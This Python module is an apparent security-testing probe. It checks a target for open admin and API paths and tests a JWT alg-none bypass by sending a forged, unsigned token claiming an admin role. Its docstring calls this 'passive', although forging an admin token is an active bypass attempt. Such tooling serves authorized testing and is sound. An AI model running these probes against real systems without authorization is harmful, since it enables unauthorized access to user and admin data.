"""Auth-bypass probe — admin path discovery and JWT alg:none bypass.

Two passive techniques, both GET-only:
1. Admin path discovery: try common admin/API endpoints; flag 200s that aren't
   login-page redirects.
2. JWT alg:none: craft an unsigned JWT (no credentials needed), present it as
   a Bearer token, and check whether the server accepts it for protected paths.

`auth_testing_authorized` in roe.md is required for credential-based checks
(not used here). These two techniques are read-only and don't require accounts.
"""

from __future__ import annotations

import base64
import json
from urllib.parse import urljoin

import httpx

from earn_money.recon.signals import Signal
from earn_money.triage import hashing

ADMIN_PATHS: tuple[str, ...] = (
    "/admin",
    "/api/Users",
    "/api/SecurityAnswers",
    "/api/Feedbacks",
    "/rest/admin/application-configuration",
    "/administration",
    "/manage",
    "/management",
    "/admin/users",
    "/api/admin",
)

_LOGIN_INDICATORS = ("login", "signin", "sign-in", "authenticate", "401", "403")


def _make_alg_none_jwt(email: str = "admin@juice-sh.op", role: str = "admin") -> str:
    """Craft a JWT with alg:none — no signature — as a read-only probe."""
    header = base64.urlsafe_b64encode(
        json.dumps({"typ": "JWT", "alg": "none"}).encode()
    ).rstrip(b"=").decode()
    payload = base64.urlsafe_b64encode(
        json.dumps({"email": email, "role": role}).encode()
    ).rstrip(b"=").decode()
    return f"{header}.{payload}."


def _is_login_redirect(resp: httpx.Response) -> bool:
    if resp.status_code in (301, 302, 303, 307, 308):
        loc = resp.headers.get("location", "").lower()
        return any(ind in loc for ind in _LOGIN_INDICATORS)
    body_lower = resp.text.lower()[:500]
    return any(ind in body_lower for ind in _LOGIN_INDICATORS)


def probe_service(
    base_url: str,
    *,
    client: httpx.Client,
    run_id: str,
    observed_at: str,
) -> list[Signal]:
    """Probe `base_url` for admin path access and JWT alg:none bypass."""
    signals: list[Signal] = []

    for path in ADMIN_PATHS:
        url = urljoin(base_url, path)
        try:
            resp = client.get(url)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and not _is_login_redirect(resp):
            signals.append(_make_signal(
                url, "admin_path_open",
                f"status={resp.status_code} len={len(resp.text)}",
                run_id=run_id, observed_at=observed_at,
            ))

    # JWT alg:none: try /api/Users with unsigned token
    jwt = _make_alg_none_jwt()
    api_url = urljoin(base_url, "/api/Users")
    try:
        resp = client.get(api_url, headers={"Authorization": f"Bearer {jwt}"})
        if resp.status_code == 200 and not _is_login_redirect(resp):
            signals.append(_make_signal(
                api_url, "jwt_alg_none",
                f"status={resp.status_code} len={len(resp.text)}",
                run_id=run_id, observed_at=observed_at,
            ))
    except httpx.HTTPError:
        pass

    return signals


def _make_signal(
    url: str, kind: str, evidence: str,
    *, run_id: str, observed_at: str,
) -> Signal:
    asset = hashing.normalize_asset(url)
    target = hashing.normalize_target(url)
    normalized = hashing.normalize_target(url)
    signature = f"auth-bypass|{kind}|{normalized[:20]}"
    payload = json.dumps(
        {"url": url, "kind": kind, "evidence": evidence, "severity": "high"},
        sort_keys=True,
    )
    return Signal(
        run_id=run_id, tool="auth-bypass-probe", signal_type="auth_bypass_candidate",
        asset=asset, target=target, signature=signature,
        payload=payload, observed_at=observed_at,
    )
